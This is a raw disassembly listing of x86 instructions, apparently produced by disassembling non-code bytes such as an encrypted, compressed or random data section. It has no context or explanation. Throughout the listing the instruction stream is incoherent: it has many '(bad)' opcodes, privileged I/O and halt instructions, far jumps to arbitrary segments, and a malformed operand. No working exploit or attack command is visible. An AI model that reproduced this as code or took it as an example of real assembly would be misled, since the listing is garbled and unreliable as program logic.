  412fed:	cmp    eax,0x150f6801
  412ff2:	add    eax,0xbf33c69e
  412ff7:	jbe    0x412f94
  412ff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ffa:	pop    ecx
  412ffb:	jne    0x412fc5
  412ffd:	xchg   DWORD PTR [esi+ebx*8-0x2c],esp
  413001:	xchg   ebp,eax
  413002:	imul   esp,ecx,0xffffffa4
  413005:	loop   0x412ffb
  413007:	call   0x5079:0x38b2176
  41300e:	les    edx,FWORD PTR [esi-0x26]
  413011:	dec    DWORD PTR [edx]
  413013:	lahf   
  413014:	jle    0x413076
  413016:	xchg   edi,eax
  413017:	leave  
  413018:	xor    BYTE PTR [eax-0x42e4368c],cl
  41301e:	push   ss
  41301f:	adc    BYTE PTR [edx+0x32],al
  413022:	push   ds
  413023:	inc    edx
  413024:	cmp    eax,DWORD PTR [eax+0x53]
  413027:	push   ebx
  413028:	js     0x412fb9
  41302a:	(bad)  
  41302b:	(bad)  
  41302c:	push   ds
  41302d:	mov    esp,0xd189e334
  413032:	mov    ecx,0x45e3de6c
  413037:	adc    bl,cl
  413039:	push   edx
  41303a:	sbb    edx,esp
  41303c:	fcom   QWORD PTR [ecx-0x5f]
  41303f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413040:	add    BYTE PTR [ebp-0x112f4859],dh
  413046:	xchg   edi,eax
  413047:	retf   
  413048:	add    BYTE PTR ds:0x53ab82b2,0xea
  41304f:	xchg   BYTE PTR [eax],cl
  413051:	mov    edx,DWORD PTR [edi*4-0xe8df166]
  413058:	cld    
  413059:	pop    eax
  41305a:	ret    0xe793
  41305d:	gs out 0x32,eax
  413060:	lock push ecx
  413062:	mov    dh,0xab
  413064:	and    al,BYTE PTR [ebp-0x43]
  413067:	adc    edx,DWORD PTR ss:[edi-0xf7bc41d]
  41306e:	int    0x51
  413070:	dec    esp
  413071:	and    bl,BYTE PTR [ecx-0x74f5c28d]
  413077:	out    dx,eax
  413078:	push   ebx
  413079:	push   esp
  41307a:	outs   dx,DWORD PTR ds:[esi]
  41307b:	xor    BYTE PTR [ecx-0x247f429c],bh
  413081:	push   eax
  413082:	rcr    DWORD PTR [edx+eax*8],1
  413085:	les    esp,FWORD PTR [ebx-0x769070ab]
  41308b:	sbb    eax,DWORD PTR ds:0x104f8f2a
  413091:	mov    dh,0xc4
  413093:	dec    esp
  413094:	fiadd  WORD PTR [edx]
  413096:	xlat   BYTE PTR ds:[ebx]
  413097:	cld    
  413098:	sub    BYTE PTR [ebp+0xd],bh
  41309b:	bound  edi,QWORD PTR [edx+eiz*8+0x32e85d4d]
  4130a2:	mov    eax,ds:0xbb671927
  4130a7:	lods   al,BYTE PTR ds:[esi]
  4130a8:	lahf   
  4130a9:	xchg   edx,eax
  4130aa:	lods   eax,DWORD PTR ds:[esi]
  4130ab:	xor    ebx,DWORD PTR [ecx]
  4130ad:	stos   BYTE PTR es:[edi],al
  4130ae:	dec    eax
  4130af:	fld    TBYTE PTR [ecx]
  4130b1:	add    bh,0x61
  4130b4:	fs hlt 
  4130b6:	dec    edi
  4130b7:	loop   0x413094
  4130b9:	xchg   ebp,eax
  4130ba:	ins    DWORD PTR es:[edi],dx
  4130bb:	push   ss
  4130bc:	into   
  4130bd:	gs xchg esi,eax
  4130bf:	mov    DWORD PTR [ecx+0x58589678],esp
  4130c5:	xor    eax,0xff20ffc1
  4130ca:	jp     0x413093
  4130cc:	mov    WORD PTR [ebx+0x7a],fs
  4130cf:	mov    ch,0x35
  4130d1:	into   
  4130d2:	dec    ebp
  4130d3:	aam    0x2e
  4130d5:	jno    0x413089
  4130d7:	jmp    0x8896:0x90027fe
  4130de:	loopne 0x413113
  4130e0:	fstp   QWORD PTR [eax+0x58]
  4130e3:	add    eax,0x83b47c65
  4130e8:	call   0xd31a3cb7
  4130ed:	pop    esi
  4130ee:	mov    cl,0xb1
  4130f0:	ret    0x145c
  4130f3:	retf   0xfe61
  4130f6:	nop
  4130f7:	mov    al,BYTE PTR [ebp-0x77]
  4130fa:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130fc:	inc    esp
  4130fd:	sar    DWORD PTR [ebx],1
  4130ff:	push   cs
  413100:	or     eax,0x75f45cbe
  413105:	mov    ch,0x5a
  413107:	cmp    eax,0x8d381b1c
  41310c:	jmp    0x129e699a
  413111:	lahf   
  413112:	xchg   edi,eax
  413113:	aad    0x84
  413115:	fdivr  DWORD PTR [edx]
  413117:	push   esp
  413118:	sbb    BYTE PTR [edi],dh
  41311a:	cmp    ebp,ebx
  41311c:	xchg   ecx,eax
  41311d:	xchg   edx,eax
  41311e:	mov    eax,0x5362469e
  413123:	shl    edx,cl
  413125:	or     edx,esp
  413127:	add    ch,BYTE PTR [edi+eax*2-0x2b]
  41312b:	jge    0x413126
  41312d:	mov    al,0xb
  41312f:	fcomp  DWORD PTR [esi]
  413131:	xor    eax,0x4187f2d1
  413136:	mov    ds:0xfb2af912,eax
  41313b:	lods   eax,DWORD PTR ds:[esi]
  41313c:	addr16 push esp
  41313e:	mov    dh,0x2f
  413140:	adc    al,0x7
  413142:	cmp    eax,0x43893c4c
  413147:	arpl   bx,sp
  413149:	jle    0x413129
  41314b:	out    0xc0,al
  41314d:	dec    ebp
  41314e:	pop    es
  41314f:	(bad)  
  413150:	push   edi
  413151:	and    BYTE PTR [edx],cl
  413153:	mov    edi,0x12efe93e
  413158:	xchg   edx,eax
  413159:	ins    BYTE PTR es:[edi],dx
  41315a:	rol    DWORD PTR [ebx],cl
  41315c:	loopne 0x4131b6
  41315e:	clc    
  41315f:	pusha  
  413160:	fnstsw WORD PTR [esi+0x77]
  413163:	xor    ebx,DWORD PTR [edi+0x35]
  413166:	aas    
  413167:	xor    BYTE PTR [edx+0x47ed309e],0x4c
  41316e:	push   0x7ce938d9
  413173:	leave  
  413174:	mov    esi,0xb4c45d7b
  413179:	inc    ebp
  41317a:	(bad)
  41317d:	ja     0x4131c2
  41317f:	mov    al,ds:0x3f31dc15
  413184:	xchg   ecx,eax
  413185:	cmp    esi,ecx
  413187:	cs sbb al,0xa2
  41318a:	aaa    
  41318b:	test   al,0xba
  41318d:	les    edi,FWORD PTR [edi-0x254c37de]
  413193:	xor    al,0x45
  413195:	bound  edx,QWORD PTR [ebx-0xf05beb2]
  41319b:	pop    ss
  41319c:	add    al,0xea
  41319e:	std    
  41319f:	jo     0x4131fc
  4131a1:	loop   0x41314c
  4131a3:	cld    
  4131a4:	sti    
  4131a5:	retf   
  4131a6:	add    esi,DWORD PTR [ebx-0x2078f906]
  4131ac:	dec    edx
  4131ad:	mov    ebx,0x323d878b
  4131b2:	test   eax,0x1302535a
  4131b7:	and    DWORD PTR [ecx-0x712c6d40],ecx
  4131bd:	pop    edx
  4131be:	cld    
  4131bf:	test   BYTE PTR [esi-0x7],bl
  4131c2:	xchg   ebx,eax
  4131c3:	into   
  4131c4:	sbb    eax,DWORD PTR [esi-0x51751edc]
  4131ca:	sub    esp,eax
  4131cc:	(bad)  
  4131ce:	call   0x48144393
  4131d3:	dec    edi
  4131d4:	fcmovnbe st,st(2)
  4131d6:	dec    ecx
  4131d7:	push   es
  4131d8:	xor    BYTE PTR [esi+0x18],ah
  4131db:	ret    0x9303
  4131de:	shr    BYTE PTR [edi],1
  4131e0:	sub    BYTE PTR [esi-0x39],al
  4131e3:	xchg   ebx,eax
  4131e4:	xchg   ecx,eax
  4131e5:	jnp    0x413189
  4131e7:	pop    edx
  4131e8:	addr16 ja 0x413262
  4131eb:	inc    ecx
  4131ec:	sbb    BYTE PTR [ecx+ebp*2-0x9],ah
  4131f0:	xchg   esp,eax
  4131f1:	push   es
  4131f2:	aas    
  4131f3:	(bad)  
  4131f4:	xor    BYTE PTR [edi+0x46fe4a4],bh
  4131fa:	xchg   ebp,eax
  4131fb:	das    
  4131fc:	(bad)  
  4131fd:	out    0x42,al
  4131ff:	mov    esp,0x40d9dd2b
  413204:	ds out 0x94,eax
  413207:	xchg   ecx,eax
  413208:	clc    
  413209:	out    dx,al
  41320a:	jns    0x4131c7
  41320c:	adc    dh,BYTE PTR [ebx+0x21]
  41320f:	pushf  
  413210:	ret    
  413211:	cld    
  413212:	ret    0x8bad
  413215:	not    edi
  413217:	gs and al,0xfe
  41321a:	and    eax,0xd32b37c
  41321f:	in     eax,dx
  413220:	loop   0x413276
  413222:	push   esp
  413223:	aaa    
  413224:	adc    bl,BYTE PTR [edi+0x12]
  413227:	aaa    
  413228:	cmovo  esp,DWORD PTR [ebp+0x61]
  41322c:	out    0x14,al
  41322e:	addr16 push ss
  413230:	and    BYTE PTR ds:0x2c889bf3,ah
  413236:	sbb    DWORD PTR [eax+0x2bdb0f42],eax
  41323c:	mov    bh,0xed
  41323e:	lods   eax,DWORD PTR ds:[esi]
  41323f:	shr    BYTE PTR [edi],cl
  413241:	xlat   BYTE PTR ds:[ebx]
  413242:	mov    ebx,0x4ce3aa0
  413247:	mov    cl,0xd9
  413249:	xor    BYTE PTR [eax-0x71ae3c31],0x6a
  413250:	shr    DWORD PTR [edx+esi*4],0x76
  413254:	mov    BYTE PTR [ebx+0x3b],dl
  413257:	jne    0x413257
  413259:	pop    ecx
  41325a:	outs   dx,DWORD PTR ds:[esi]
  41325b:	add    eax,0xb0afa7af
  413260:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  413262:	add    al,0x62
  413264:	push   ebx
  413265:	(bad)  
  413266:	pop    esi
  413267:	fld1   
  413269:	mov    edx,0xf227ab9a
  41326e:	out    0xf,eax
  413270:	out    0x58,eax
  413272:	and    eax,0x4cbe3ea7
  413277:	xor    al,0x68
  413279:	(bad)  
  41327a:	jecxz  0x4132a3
  41327c:	dec    ebx
  41327d:	mov    ecx,0xae762b44
  413282:	nop
  413283:	mov    ch,0x8e
  413285:	jo     0x4132f9
  413287:	hlt    
  413288:	mov    bh,0xfb
  41328a:	loopne 0x41325e
  41328c:	mov    bh,0xdf
  41328e:	or     dl,bh
  413290:	int    0xd7
  413292:	cs xchg ecx,eax
  413294:	jge    0x41323c
  413296:	sbb    dl,dl
  413298:	mov    eax,ds:0x5199ee73
  41329d:	clc    
  41329e:	ins    DWORD PTR es:[edi],dx
  41329f:	imul   ebp,DWORD PTR [esi-0x33],0x22aaa1d8
  4132a6:	sbb    dh,BYTE PTR [edi+0x6b]
  4132a9:	fcom   QWORD PTR [edx+0x6d72b1b5]
  4132af:	cmp    BYTE PTR [esi-0x38],ah
  4132b2:	cmp    eax,0xc02dd95c
  4132b7:	xchg   ecx,eax
  4132b8:	add    BYTE PTR [ecx+0x39],dh
  4132bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132bc:	(bad)
  4132bf:	push   edi
  4132c0:	jecxz  0x4132ef
  4132c2:	dec    ebp
  4132c3:	mov    ebp,ecx
  4132c5:	sbb    esp,DWORD PTR [eax+0x1622c923]
  4132cb:	fisttp WORD PTR [ecx+0x2f42fdf6]
  4132d1:	(bad)  
  4132d2:	lods   al,BYTE PTR ds:[esi]
  4132d3:	ss pop ss
  4132d5:	pop    ds
  4132d6:	xchg   ecx,eax
  4132d7:	aas    
  4132d8:	jecxz  0x4132cd
  4132da:	in     eax,dx
  4132db:	jge    0x4132d1
  4132dd:	dec    ebx
  4132de:	xchg   ecx,eax
  4132df:	xor    ebp,eax
  4132e1:	test   BYTE PTR [ebx-0x4e],0x72
  4132e5:	shl    DWORD PTR [ebx+0x51],1
  4132e8:	push   eax
  4132e9:	shr    BYTE PTR ds:0xcb657804,cl
  4132ef:	sbb    al,0xac
  4132f1:	adc    cl,bl
  4132f3:	add    DWORD PTR [ebp-0x51],ebp
  4132f6:	jno    0x4132f0
  4132f8:	pop    edx
  4132f9:	fcom   DWORD PTR [ecx]
  4132fb:	mov    ah,0x35
  4132fd:	pop    edx
  4132fe:	dec    ebp
  4132ff:	cmp    BYTE PTR [esi+0x3be77822],cl
  413305:	int    0x61
  413307:	dec    ebp
  413308:	mov    BYTE PTR [edx+0x64f9e7bf],0x2d
  41330f:	mov    ?,WORD PTR [ecx]
  413311:	out    dx,al
  413312:	sti    
  413313:	frstor [esi-0x1d]
  413316:	mov    ds:0x8fa02214,al
  41331b:	cmp    DWORD PTR [eax-0x1b70f4da],edx
  413321:	aam    0x62
  413323:	(bad)  
  413324:	push   eax
  413325:	mov    eax,ds:0x663a253f
  41332a:	or     eax,0x58f0401b
  41332f:	jo     0x413330
  413331:	dec    eax
  413332:	push   edi
  413333:	test   eax,0x8b02add5
  413338:	and    ecx,DWORD PTR [edi+0x1304f524]
  41333e:	jnp    0x41339a
  413340:	adc    al,BYTE PTR [edi+ebx*2-0x39]
  413344:	mov    edx,DWORD PTR [edx]
  413346:	dec    esp
  413347:	retf   
  413348:	call   0x6b0387a4
  41334d:	mov    bl,0x13
  41334f:	mov    dh,0xda
  413351:	xor    BYTE PTR [di+0x6332],ah
  413356:	fcomp  QWORD PTR [ebx+0x6d3d0411]
  41335c:	xor    cl,BYTE PTR [ebp+0x5e42e97]
  413362:	lods   al,BYTE PTR ds:[esi]
  413363:	pushf  
  413364:	(bad)  
  413365:	mov    cl,BYTE PTR [edx+0x4f03066b]
  41336b:	sub    ebp,DWORD PTR [edx-0x117c92ca]
  413371:	shr    dh,1
  413373:	dec    ecx
  413374:	shl    DWORD PTR [esi],cl
  413376:	jle    0x41336a
  413378:	and    edx,ebx
  41337a:	xchg   esp,eax
  41337b:	push   ss
  41337c:	clc    
  41337d:	add    eax,0x28cbd428
  413382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413383:	mov    dl,0x3e
  413385:	mov    edi,0xe0c3cccc
  41338a:	retf   
  41338b:	inc    ebp
  41338c:	outs   dx,DWORD PTR ds:[esi]
  41338d:	cmp    eax,0xe523499c
  413392:	sub    BYTE PTR [eax+0x1a],0xc7
  413396:	imul   ebp,DWORD PTR [ebx+0x5c91796a],0x73
  41339d:	mov    WORD PTR [esi],ss
  41339f:	out    0x65,al
  4133a1:	or     BYTE PTR [ecx],cl
  4133a3:	mov    ebx,0xe86643bf
  4133a8:	sbb    ebx,edi
  4133aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133ab:	loope  0x413421
  4133ad:	or     BYTE PTR [ebx-0x20],bl
  4133b0:	cmp    DWORD PTR [edi],ebx
  4133b2:	xchg   ebx,eax
  4133b3:	pop    edi
  4133b4:	dec    edx
  4133b5:	fsubrp st(2),st
  4133b7:	bswap  esi
  4133b9:	sub    dl,BYTE PTR [ebx+0x243fa33c]
  4133bf:	mov    bl,0x86
  4133c1:	jo     0x413387
  4133c3:	imul   BYTE PTR [ebp+0x10]
  4133c6:	ja     0x413426
  4133c8:	sar    BYTE PTR [esi+esi*2],0xf7
  4133cc:	(bad)  
  4133cd:	loopne 0x413418
  4133cf:	aas    
  4133d0:	push   ss
  4133d1:	retf   
  4133d2:	sub    eax,0xabffeaef
  4133d7:	cdq    
  4133d8:	push   ecx
  4133d9:	fwait
  4133da:	cmp    al,0x3e
  4133dc:	(bad)  
  4133dd:	mov    esp,0x37dcd4dd
  4133e2:	dec    edx
  4133e3:	(bad)  
  4133e5:	jbe    0x4133f8
  4133e7:	jmp    0x413439
  4133e9:	jb     0x4133e9
  4133eb:	arpl   WORD PTR [esi-0x389b6b6c],di
  4133f1:	mov    ds:0xfa3de198,eax
  4133f6:	dec    esp
  4133f7:	js     0x413422
  4133f9:	pop    edx
  4133fa:	jp     0x4133fc
  4133fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133fd:	aam    0x98
  4133ff:	mov    al,ds:0xdc978b8a
  413404:	push   esp
  413405:	xchg   edx,eax
  413406:	out    0x37,al
  413408:	jmp    0x41339d
  41340a:	rol    DWORD PTR [eax],cl
  41340c:	sbb    al,0x8a
  41340e:	into   
  41340f:	push   ds
  413410:	push   ecx
  413411:	nop
  413412:	into   
  413413:	cmp    al,0x9d
  413415:	jmp    0x6c7a0c70
  41341a:	dec    ecx
  41341b:	cmp    al,0x8a
  41341d:	cld    
  41341e:	mov    bl,0xb8
  413420:	jg     0x413479
  413422:	imul   ebx,ebp,0x42
  413425:	add    BYTE PTR [ebp-0x56],bl
  413428:	cmovp  ebp,DWORD PTR [eax]
  41342b:	jl     0x41345c
  41342d:	dec    edi
  41342e:	dec    eax
  41342f:	fwait
  413430:	fs sub eax,0x8f90b824
  413436:	les    edx,FWORD PTR [ebp+0x5a80aeaf]
  41343c:	push   0xffffff84
  41343e:	fadd   DWORD PTR [eax-0x3a]
  413441:	fmul   QWORD PTR [eax]
  413443:	adc    eax,0xb74a14fe
  413448:	cmc    
  413449:	aas    
  41344a:	icebp  
  41344b:	dec    edi
  41344c:	scas   al,BYTE PTR es:[edi]
  41344d:	push   ebp
  41344e:	xor    al,0x52
  413450:	arpl   WORD PTR [edx-0x4b],di
  413453:	arpl   bx,dx
  413455:	jns    0x4133f0
  413457:	cs inc eax
  413459:	nop
  41345a:	std    
  41345b:	xchg   esi,eax
  41345c:	(bad)  
  41345d:	or     BYTE PTR [ecx],ch
  41345f:	call   0xa389:0xa98e2e3a
  413466:	jmp    0x3997:0xda761e89
  41346d:	pop    edi
  41346e:	pop    esi
  41346f:	jns    0x41348f
  413471:	out    dx,al
  413472:	pop    esi
  413473:	enter  0x23fb,0xf1
  413477:	repz mov ecx,0x4e7e7742
  41347d:	or     bh,ch
  41347f:	inc    eax
  413480:	jbe    0x413492
  413482:	(bad)  
  413483:	test   DWORD PTR [ebp+0x5281a9ee],ecx
  413489:	xor    eax,0xe900471d
  41348e:	xor    BYTE PTR [ebx],0xd4
  413491:	jbe    0x41348b
  413493:	aaa    
  413494:	aad    0xed
  413496:	mov    ds:0x7bfdc480,al
  41349b:	adc    eax,0x18c82d6a
  4134a0:	and    al,0x85
  4134a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134a3:	cli    
  4134a4:	mov    esi,0xf5ca1b47
  4134a9:	sub    al,0xdd
  4134ab:	ds mov ch,0xe4
  4134ae:	push   0x7
  4134b0:	add    dl,ch
  4134b2:	fistp  QWORD PTR [ebp-0x28]
  4134b5:	inc    esi
  4134b6:	retf   
  4134b7:	jmp    0x25c436fc
  4134bc:	push   0x7c14ce3d
  4134c1:	push   0xb3be0df2
  4134c6:	fdivp  st(4),st
  4134c8:	xchg   ebp,eax
  4134c9:	cmc    
  4134ca:	fistp  QWORD PTR [edi+0x3965cfc1]
  4134d0:	leave  
  4134d1:	sahf   
  4134d2:	dec    eax
  4134d3:	imul   esp,ebx,0xf45ad77f
  4134d9:	jecxz  0x4134fd
  4134db:	and    ecx,ebx
  4134dd:	mov    dl,0x79
  4134df:	mov    esp,0x2d3f1ad3
  4134e4:	mov    ebp,0xc9107406
  4134e9:	shr    BYTE PTR [edi+eiz*4],0x60
  4134ed:	or     DWORD PTR [edi+0x68],ebx
  4134f0:	inc    BYTE PTR [edx+0x180e37e1]
  4134f6:	and    ah,BYTE PTR [edx-0x17]
  4134f9:	cli    
  4134fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134fb:	(bad)  
  4134fc:	pop    esp
  4134fd:	outs   dx,BYTE PTR ds:[esi]
  4134fe:	rcr    BYTE PTR [ebp-0x488a6a6e],0x35
  413505:	or     DWORD PTR [eax],ebx
  413507:	inc    esi
  413508:	adc    ch,BYTE PTR [ecx+0x4249fdda]
  41350e:	aam    0x11
  413510:	in     eax,0xa6
  413512:	sbb    al,0xa1
  413514:	pushf  
  413515:	inc    ebp
  413516:	loopne 0x413542
  413518:	mov    esp,0xcb7dfdc9
  41351d:	add    DWORD PTR [edi+0x3a82a703],0x23902ccf
  413527:	and    eax,0x771125fe
  41352c:	push   eax
  41352d:	push   ecx
  41352e:	daa    
  41352f:	pop    ecx
  413530:	inc    eax
  413531:	add    DWORD PTR [esi-0x4797906d],edi
  413537:	xor    DWORD PTR [edx],esp
  413539:	xor    al,0xbe
  41353b:	pop    edx
  41353c:	hlt    
  41353d:	sub    ch,ch
  41353f:	sub    BYTE PTR [ebx],0xdb
  413542:	ret    0xbb7d
  413545:	lods   al,BYTE PTR ds:[esi]
  413546:	in     al,0xf4
  413548:	jo     0x413588
  41354a:	aas    
  41354b:	scas   al,BYTE PTR es:[edi]
  41354c:	and    BYTE PTR [edi],dh
  41354e:	aaa    
  41354f:	jge    0x41350c
  413551:	fdiv   DWORD PTR [ebp+0x795e4a67]
  413557:	pop    esi
  413558:	popa   
  413559:	es shl ebp,0xc6
  41355d:	bound  ebx,QWORD PTR ds:0x3b600478
  413563:	cmp    dl,bh
  413565:	fcomip st,st(6)
  413567:	into   
  413568:	push   0xffffffd2
  41356a:	icebp  
  41356b:	std    
  41356c:	jmp    0x12664a43
  413571:	push   ecx
  413572:	leave  
  413573:	and    esp,0xffffffde
  413576:	dec    edi
  413577:	aam    0x27
  413579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41357a:	mov    DWORD PTR cs:[eax-0x5a],ecx
  41357e:	fwait
  41357f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413580:	fwait
  413581:	mov    ecx,ecx
  413583:	jnp    0x4135e5
  413585:	or     DWORD PTR [ebx+0x4df12ea4],ebp
  41358b:	cli    
  41358c:	lock test al,0x1f
  41358f:	mov    esi,0x727527eb
  413594:	scas   eax,DWORD PTR es:[edi]
  413595:	push   0x54859ddf
  41359a:	(bad)  
  41359b:	fistp  QWORD PTR [edi+0x3c48790d]
  4135a1:	repz imul esp,DWORD PTR [eax-0x57],0x3b85af36
  4135a9:	int    0xad
  4135ab:	aas    
  4135ac:	cmp    DWORD PTR [ecx],0xf6ef9924
  4135b2:	fwait
  4135b3:	imul   ecx,DWORD PTR [eax-0x7beeb830],0xa885fcb
  4135bd:	xor    esi,DWORD PTR [ecx]
  4135bf:	lods   eax,DWORD PTR ds:[esi]
  4135c0:	xor    eax,0x87d9023e
  4135c5:	rcl    edx,0xd1
  4135c8:	jo     0x41358c
  4135ca:	or     al,BYTE PTR [esi]
  4135cc:	jbe    0x413642
  4135ce:	pop    esp
  4135cf:	mov    esi,0x6a15a770
  4135d4:	add    al,0x12
  4135d6:	pop    esi
  4135d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135d8:	cwde   
  4135d9:	pop    edx
  4135da:	mov    ch,0x59
  4135dc:	jmp    0x41356d
  4135de:	pop    ebx
  4135df:	dec    esp
  4135e0:	(bad)  
  4135e1:	and    edi,edi
  4135e3:	and    ah,BYTE PTR [bx+si+0x1a91]
  4135e8:	cli    
  4135e9:	mov    BYTE PTR [esi+ebx*4+0x176ae09a],0x12
  4135f1:	cmp    eax,0x869e06a0
  4135f6:	and    al,0xab
  4135f8:	push   esi
  4135f9:	retf   
  4135fa:	or     BYTE PTR [esi+0xd],0xc0
  4135fe:	clc    
  4135ff:	mov    ebp,0x18022dd0
  413604:	push   edx
  413605:	ret    0xc06a
  413608:	fild   QWORD PTR [edx]
  41360a:	ret    0xff7c
  41360d:	sub    BYTE PTR [esi],dh
  41360f:	retf   
  413610:	popa   
  413611:	mov    ch,0x3c
  413613:	mov    bh,0x1e
  413615:	pop    ebp
  413616:	or     BYTE PTR [edi+0x1a],0xbc
  41361a:	pop    edi
  41361b:	lock ins DWORD PTR es:[edi],dx
  41361d:	add    eax,0x8f7d41a9
  413622:	fucomi st,st(2)
  413624:	adc    BYTE PTR [ebp+0x696b8cb2],dl
  41362a:	int3   
  41362b:	push   esp
  41362c:	mov    dl,0xb1
  41362e:	pop    DWORD PTR [edx]
  413630:	test   eax,0x27d77465
  413635:	ja     0x413693
  413637:	and    cl,BYTE PTR [edi+0x15]
  41363a:	(bad)  
  41363c:	inc    esp
  41363d:	outs   dx,BYTE PTR ds:[esi]
  41363e:	cmp    DWORD PTR [esi+0x7ed7c06a],0x15e2fa64
  413648:	ds (bad) 
  41364a:	int    0x97
  41364c:	in     al,0x93
  41364e:	or     dh,bh
  413650:	lods   eax,DWORD PTR cs:[esi]
  413652:	std    
  413653:	pop    ds
  413654:	inc    edx
  413655:	out    dx,eax
  413656:	gs jmp 0x2f181ca4
  41365c:	xchg   bl,al
  41365e:	xchg   ecx,eax
  41365f:	pop    cx
  413661:	mov    al,ds:0xe865510f
  413666:	adc    al,0xfe
  413668:	addr16 mov ebx,0x253630b
  41366e:	add    eax,0xbae67cd6
  413673:	and    ebp,DWORD PTR [eax]
  413675:	es lock and eax,edi
  413679:	sbb    ch,BYTE PTR [ecx-0x613dc2fc]
  41367f:	test   eax,0x263db89e
  413684:	push   ss
  413685:	shr    ebx,cl
  413687:	dec    esp
  413688:	cs pushf 
  41368a:	inc    eax
  41368b:	xchg   DWORD PTR [eax],ecx
  41368d:	jl     0x41363e
  41368f:	mov    bl,0x5e
  413691:	jge    0x413621
  413693:	or     DWORD PTR [edi-0x28462098],edx
  413699:	aas    
  41369a:	fldl2e 
  41369c:	cwde   
  41369d:	push   esi
  41369e:	xchg   edi,eax
  41369f:	inc    edx
  4136a0:	pop    ecx
  4136a1:	stc    
  4136a2:	xchg   ecx,eax
  4136a3:	(bad)  [edi+0x6d]
  4136a6:	sub    BYTE PTR [edi-0x4e],ch
  4136a9:	retf   
  4136aa:	leave  
  4136ab:	test   al,0xd6
  4136ad:	lods   eax,DWORD PTR ds:[esi]
  4136ae:	xor    DWORD PTR [ebx],0xa67c0507
  4136b4:	ds jl  0x4136c3
  4136b7:	arpl   di,bx
  4136b9:	into   
  4136ba:	mov    eax,0xe9c00111
  4136bf:	push   0xed04f4e4
  4136c4:	test   dh,ah
  4136c6:	xchg   ecx,eax
  4136c7:	dec    ebp
  4136c8:	mov    ch,0xb
  4136ca:	add    BYTE PTR [edx+0x22],al
  4136cd:	dec    eax
  4136ce:	push   ecx
  4136cf:	in     eax,dx
  4136d0:	mov    edi,0xac2dcfe6
  4136d5:	sbb    ebx,DWORD PTR [ebx-0x4f0f2bf2]
  4136db:	mov    ds:0x9fdf9a71,al
  4136e0:	xchg   esi,eax
  4136e1:	mov    al,ds:0xf70ab95e
  4136e6:	inc    edi
  4136e7:	fistp  DWORD PTR [eax+0x3d12c930]
  4136ed:	xchg   esp,eax
  4136ee:	pop    edi
  4136ef:	mov    al,0xec
  4136f1:	fidiv  WORD PTR [ebp+0x4f]
  4136f4:	inc    edi
  4136f5:	fsub   DWORD PTR [ecx]
  4136f7:	loop   0x4136ce
  4136f9:	mov    ds:0xac81a6f8,eax
  4136fe:	icebp  
  4136ff:	out    0x6c,al
  413701:	inc    edi
  413702:	or     DWORD PTR [ecx+ebx*4],ecx
  413705:	jg     0x4136cf
  413707:	pop    edi
  413708:	sbb    eax,0xab9493e3
  41370d:	jmp    0x4ad259df
  413712:	push   eax
  413713:	cmp    ecx,edx
  413715:	mov    bl,0x2b
  413717:	push   0xd5037f37
  41371c:	shr    cl,0x45
  41371f:	shl    dl,1
  413721:	inc    esp
  413722:	lock sbb edi,DWORD PTR [edx+0x2d]
  413726:	jle    0x4136bd
  413728:	xchg   esi,eax
  413729:	inc    esp
  41372a:	stos   BYTE PTR es:[edi],al
  41372b:	inc    edx
  41372c:	into   
  41372d:	sbb    al,0x6b
  41372f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413730:	adc    DWORD PTR [ebx+0x54],ebp
  413733:	or     eax,0xa8ae867c
  413738:	and    al,0xf
  41373a:	loop   0x4137a8
  41373c:	gs mov ah,0xc0
  41373f:	aad    0xee
  413741:	das    
  413742:	jl     0x41374c
  413744:	jmp    0x3466b37f
  413749:	fstp   TBYTE PTR [edi]
  41374b:	or     eax,0xdf7eb41
  413750:	imul   edi,DWORD PTR ds:0x12b3b88,0x72
  413757:	not    DWORD PTR [edi]
  413759:	or     al,0x57
  41375b:	call   FWORD PTR [esi-0x4888b372]
  413761:	dec    eax
  413762:	sub    al,0x8d
  413764:	dec    esp
  413765:	pushf  
  413766:	xor    ecx,DWORD PTR [ecx+0x3a]
  413769:	push   cs
  41376a:	sub    eax,0xb90582ce
  41376f:	fdivr  DWORD PTR gs:[bx+di-0x37f7]
  413775:	dec    edi
  413776:	pop    ds
  413777:	test   BYTE PTR [esp+edi*2+0x60],bh
  41377b:	mov    edi,0xbde66652
  413780:	add    BYTE PTR [eax+0x4dc35f68],0x28
  413787:	dec    ebp
  413788:	inc    ebp
  413789:	imul   esp,DWORD PTR [esi-0x4381675c],0xffffff9b
  413790:	push   cs
  413791:	jae    0x4137b5
  413793:	mov    ebx,0xe074c670
  413798:	push   0xda097899
  41379d:	mov    ecx,0x43c81e99
  4137a2:	bound  ecx,QWORD PTR [edi+0x4e522bab]
  4137a8:	and    cl,ch
  4137aa:	repz mov ebp,0xbc4ccc4e
  4137b0:	sbb    dl,dl
  4137b2:	retf   0xf5d9
  4137b5:	pop    ecx
  4137b6:	scas   al,BYTE PTR es:[edi]
  4137b7:	xchg   edi,eax
  4137b8:	pop    ebp
  4137b9:	enter  0xd9bd,0x72
  4137bd:	pushf  
  4137be:	jmp    0x41376f
  4137c0:	jne    0x4137f3
  4137c2:	jbe    0x41377e
  4137c4:	cs test eax,0x4115c9c5
  4137ca:	sub    bh,BYTE PTR [ecx-0x50]
  4137cd:	mov    ch,0xd6
  4137cf:	dec    ebx
  4137d0:	pusha  
  4137d1:	push   0x617b2624
  4137d6:	fwait
  4137d7:	xchg   ebp,eax
  4137d8:	xlat   BYTE PTR ds:[ebx]
  4137d9:	cmc    
  4137da:	test   al,0x67
  4137dc:	shl    BYTE PTR [esi+0x4a7b5961],cl
  4137e2:	push   ss
  4137e3:	and    esp,DWORD PTR [eax-0x60]
  4137e6:	mov    ebx,0xc702b4f6
  4137eb:	fsubp  st(0),st
  4137ed:	dec    esp
